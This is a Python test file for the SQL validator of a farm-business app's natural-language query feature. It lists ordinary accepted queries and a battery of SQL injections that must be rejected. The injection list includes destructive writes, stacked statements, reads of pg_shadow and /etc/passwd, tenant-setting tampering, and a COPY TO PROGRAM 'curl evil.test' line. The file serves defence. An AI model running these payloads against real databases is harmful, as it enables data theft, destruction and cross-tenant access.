"""AN-016: the SQL validator, including the injection battery the requirement asks for.

Every string in :data:`INJECTIONS` must be rejected. They are the shapes that get past a
naive "does it start with SELECT?" check: stacked statements, CTE-based writes, catalogue
reads, ``COPY``, function abuse, casts that resolve catalogue objects, and locking clauses.
"""

from __future__ import annotations

import pytest

from farmerapp.nlq.sql_guard import ALLOWED_FUNCTIONS, SqlRejectedError, validate
from farmerapp.nlq.views import VIEW_NAMES

# --------------------------------------------------------------------------- accepted
ACCEPTED = [
    # the SPEC's own acceptance question
    "SELECT officer_name, verified_visits FROM v_officer_week "
    "WHERE week_start = DATE '2026-09-14' AND verified_visits < 3 ORDER BY verified_visits",
    "SELECT store_code, SUM(net_paise) AS net FROM v_store_day GROUP BY store_code "
    "ORDER BY net DESC LIMIT 5",
    "WITH w AS (SELECT * FROM v_officer_week) SELECT officer_name FROM w WHERE visits > 2",
    "SELECT date_trunc('month', date_day) AS m, sum(net_paise) FROM v_store_day GROUP BY 1",
    "SELECT count(*) FROM v_farmer_summary WHERE district = 'Warangal' AND acres > 2",
    "SELECT crop_code, modal_price_paise / 100.0 AS rupees FROM v_mandi_price_latest",
    "SELECT r.store_code, r.attributed FROM v_referral_store r "
    "JOIN v_store_day s ON s.store_id = r.store_id",
    "SELECT * FROM public.v_store_day",
    "SELECT officer_name FROM v_officer_week UNION ALL SELECT store_code FROM v_store_day",
    "SELECT store_code, RANK() OVER (ORDER BY net_paise DESC) FROM v_store_day",
    "SELECT CASE WHEN verified_visits < 3 THEN 'low' ELSE 'ok' END FROM v_officer_week",
    "SELECT date_day::text, orders::bigint FROM v_store_day",
]


@pytest.mark.parametrize("sql", ACCEPTED, ids=range(len(ACCEPTED)))
def test_ordinary_business_sql_is_accepted(sql: str) -> None:
    valid = validate(sql, row_limit=50)
    assert set(valid.relations) <= VIEW_NAMES
    assert "LIMIT" in valid.executable.upper()


# --------------------------------------------------------------------------- rejected
INJECTIONS = [
    # writes, plain
    "DELETE FROM farmer",
    "UPDATE farmer SET name = 'x'",
    "INSERT INTO referral (code) VALUES ('X')",
    "TRUNCATE farmer",
    "DROP VIEW v_officer_week",
    "CREATE TABLE evil (a int)",
    "ALTER TABLE farmer ADD COLUMN evil text",
    "GRANT SELECT ON farmer TO PUBLIC",
    # stacked statements
    "SELECT 1; DROP TABLE farmer",
    "SELECT * FROM v_store_day; DELETE FROM referral",
    # CTE-based writes (the one a "starts with SELECT" check misses)
    "WITH x AS (DELETE FROM referral RETURNING *) SELECT * FROM x",
    "WITH x AS (UPDATE farmer SET name = 'x' RETURNING id) SELECT * FROM x",
    "WITH x AS (INSERT INTO referral (code) VALUES ('X') RETURNING id) SELECT * FROM x",
    # tables and other schemas
    "SELECT * FROM farmer",
    "SELECT name, phone FROM farmer",
    "SELECT * FROM referral",
    "SELECT * FROM pg_catalog.pg_tables",
    "SELECT * FROM information_schema.tables",
    "SELECT * FROM pg_stat_activity",
    "SELECT * FROM pg_roles",
    "SELECT * FROM otherdb.public.v_store_day",
    "SELECT * FROM v_store_day UNION SELECT * FROM pg_shadow",
    "SELECT * FROM v_officer_week WHERE officer_name = (SELECT name FROM farmer LIMIT 1)",
    # COPY and commands
    "COPY v_officer_week TO '/tmp/out.csv'",
    "COPY (SELECT * FROM v_officer_week) TO PROGRAM 'curl evil.test'",
    "SET ROLE postgres",
    "CALL some_procedure()",
    "DO $$ BEGIN PERFORM 1; END $$",
    "VACUUM",
    # function abuse
    "SELECT pg_read_file('/etc/passwd') FROM v_store_day",
    "SELECT pg_sleep(30) FROM v_store_day",
    "SELECT dblink('x', 'y') FROM v_store_day",
    "SELECT lo_import('/etc/passwd') FROM v_store_day",
    "SELECT query_to_xml('select 1', true, true, '') FROM v_store_day",
    "SELECT current_setting('app.tenant_id') FROM v_store_day",
    "SELECT set_config('app.tenant_id', '0', false) FROM v_store_day",
    "SELECT pg_ls_dir('.') FROM v_store_day",
    "SELECT 'farmer'::regclass FROM v_store_day",
    # SELECT ... INTO is a write in SELECT clothing
    "SELECT * INTO evil FROM v_officer_week",
    # locking needs write intent
    "SELECT * FROM v_officer_week FOR UPDATE",
    "SELECT * FROM v_officer_week FOR SHARE",
    # nothing readable at all
    "SELECT 1",
    "",
    "   ",
    "this is not sql at all ((",
]


@pytest.mark.parametrize("sql", INJECTIONS, ids=range(len(INJECTIONS)))
def test_every_injection_is_rejected(sql: str) -> None:
    with pytest.raises(SqlRejectedError) as exc:
        validate(sql, row_limit=50)
    assert exc.value.reason  # the caller always gets a readable reason


def test_the_reason_names_the_allowed_views() -> None:
    with pytest.raises(SqlRejectedError) as exc:
        validate("SELECT * FROM farmer")
    assert "v_officer_week" in exc.value.reason


# --------------------------------------------------------------------------- row cap
def test_the_row_limit_is_applied_and_a_smaller_one_is_kept() -> None:
    capped = validate("SELECT * FROM v_store_day", row_limit=25)
    assert capped.executable.rstrip().endswith("LIMIT 25")
    smaller = validate("SELECT * FROM v_store_day LIMIT 5", row_limit=25)
    assert smaller.executable.rstrip().endswith("LIMIT 5")
    bigger = validate("SELECT * FROM v_store_day LIMIT 5000", row_limit=25)
    assert bigger.executable.rstrip().endswith("LIMIT 25")


def test_the_returned_sql_is_the_generated_one_without_the_cap() -> None:
    valid = validate("select * from v_store_day", row_limit=25)
    assert "LIMIT" not in valid.sql.upper()  # what the console shows as "SQL used"
    assert "v_store_day" in valid.sql


# --------------------------------------------------------------------------- allowlist shape
@pytest.mark.parametrize(
    ("postgres_spelling", "canonical"),
    [
        ("date_trunc('month', date_day)", "timestamp_trunc"),
        ("to_char(date_day, 'YYYY')", "time_to_str"),
        ("string_agg(store_code, ',')", "group_concat"),
    ],
)
def test_the_allowlist_uses_sqlglots_canonical_names(
    postgres_spelling: str, canonical: str
) -> None:
    """A sqlglot upgrade that renames one of these makes an ordinary question fail, so the
    mapping is pinned here rather than discovered in production."""
    assert canonical in ALLOWED_FUNCTIONS
    validate(f"SELECT {postgres_spelling} FROM v_store_day", row_limit=10)


def test_no_catalogue_function_is_on_the_allowlist() -> None:
    assert not any(name.startswith("pg_") for name in ALLOWED_FUNCTIONS)
    assert "current_setting" not in ALLOWED_FUNCTIONS
    assert "set_config" not in ALLOWED_FUNCTIONS
